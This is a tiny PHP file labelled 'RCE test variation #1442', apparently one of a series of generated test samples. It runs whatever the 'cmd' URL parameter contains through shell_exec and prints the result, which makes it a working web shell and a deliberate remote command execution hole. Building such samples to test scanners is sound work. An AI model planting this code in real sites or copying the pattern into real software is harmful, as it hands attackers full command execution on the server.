<?php
// RCE test variation #1442
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>